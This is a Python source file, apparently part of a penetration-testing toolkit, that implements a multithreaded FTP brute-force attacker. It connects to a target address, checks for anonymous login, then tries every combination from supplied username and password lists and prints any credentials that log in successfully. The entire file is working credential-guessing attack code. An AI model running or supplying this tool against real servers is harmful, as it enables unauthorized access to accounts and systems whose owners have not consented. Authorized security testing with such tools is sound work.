from ftplib import FTP
from tqdm import tqdm
import threading
import time
from lib.helper import *

class bruteforce_class:

    def __init__(self, username_list : list, password_list : list, address : str, port : int, max_thread = 10, delay = 0):
        self.username = username_list
        self.password = password_list
        self.address = address
        self.port =  21 if port == 0 else port
        self.thread_max_num = max_thread
        self.delay = delay
        self.success = False
        
        # test connection
        try:
            ftp_test = FTP()
            ftp_test.connect(self.address, self.port)
        except(ConnectionRefusedError, TimeoutError):
            exit('[!] Connection failed, server may not have ftp service enabled.')
        try:
            ftp_test.login('anonymous','')
            print_c('[*] FTP server allows anonymous login!')
        except:
            pass
    
    def ftp_login(self, username, password):
        # connection
        ftp = FTP()
        ftp.connect(self.address, self.port)

        # try to login
        try:
            resp = ftp.login(username, password)
        except:
            ftp.quit()
            return

        if resp == '230 Login successful.':
            print_c(  '[*] FTP login successful.' + 
                    '\n[*] Username : ' + username +
                    '\n[*] Password : ' + password)
            ftp.quit()
            self.success = True
            exit()

    def bruteforce_func(self):
        # starting
        print_c('[*] FTP bruteforce starting.')
        min_thread = threading.enumerate()

        combine = lists_conbine(self.username, self.password)
        pbar = tqdm(combine, ncols = 100, ascii = ' =', mininterval = 0.01, bar_format='{percentage:3.2f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}]')
        for user_pass in combine:
            time.sleep(self.delay)
            t = threading.Thread(target = self.ftp_login, args = user_pass)
            t.start()
            pbar.update(1)
            while True:
                if len(threading.enumerate()) < self.thread_max_num:
                    break
        pbar.close()

        # ending
        while True:
            if threading.enumerate() <= min_thread:
                if self.success == False:
                    print_c('[*] FTP bruteforce unsuccessful.')
                break
        print_c('[*] FTP bruteforce finished.')
        return

if __name__ == '__main__':
    pass